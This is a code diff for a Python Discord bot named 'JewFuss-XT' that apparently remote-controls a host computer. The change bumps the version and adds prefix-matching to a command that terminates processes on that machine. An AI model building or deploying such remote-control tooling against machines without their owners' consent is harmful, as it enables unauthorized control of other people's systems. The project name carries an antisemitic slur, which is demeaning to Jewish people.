@@ -48,7 +48,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.8.3" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.8.4" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -2580,7 +2580,17 @@ async def kill(ctx, arg: str = ""):
                     terminated += 1
                 except psutil.NoSuchProcess:
                     pass
-                        
+    
+        if terminated <= 0:
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'].lower().rstrip(".exe").startswith(arg.lower().rstrip(".exe")):
+                    try:
+                        psutil.Process(proc.info['pid']).terminate()
+                        firstProcName = proc.info['name']
+                        terminated += 1
+                    except psutil.NoSuchProcess:
+                        pass    
+        
         if terminated > 0:
             await ctx.send(f"Terminated **{terminated}** processes with the name `{arg}`")
         else:
